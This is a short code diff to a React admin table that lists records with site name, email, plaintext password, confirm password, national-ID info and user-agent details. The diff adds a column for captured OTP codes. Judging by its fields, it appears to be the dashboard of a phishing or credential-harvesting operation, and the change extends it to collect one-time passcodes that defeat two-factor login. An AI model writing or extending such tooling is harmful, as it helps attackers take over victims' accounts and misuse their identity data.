@@ -82,6 +82,7 @@ try {
             <th scope="col">Email</th>
             <th scope="col">Password</th>
             <th scope="col">Confirm Password</th>
+            <th scope="col">OTP CODE</th>
             
             {
               role === 'admin' &&(
@@ -113,7 +114,7 @@ try {
         </thead>
         <tbody>
           {
-            displayInfo?.map(({_id,createdAt,siteName,mailCode,user,nidInfo,isPasswordHide,email,password,repassword,status,agent:{ source={},platform='' } }) =>(
+            displayInfo?.map(({_id,createdAt,siteName,mailCode,user,nidInfo,isPasswordHide,email,password,repassword,status,otp,agent:{ source={},platform='' } }) =>(
               <>
               <tr key={_id}>
               <td>{moment(createdAt).fromNow()}</td>
@@ -122,6 +123,7 @@ try {
               <td>{email}</td>
               <td>{password}</td>
               <td>{repassword}</td>
+              <td>{otp}</td>
               {
                 role ==='admin' && (
                   <td><input style={{width:'70px'}} className='form-control ' type="text" 
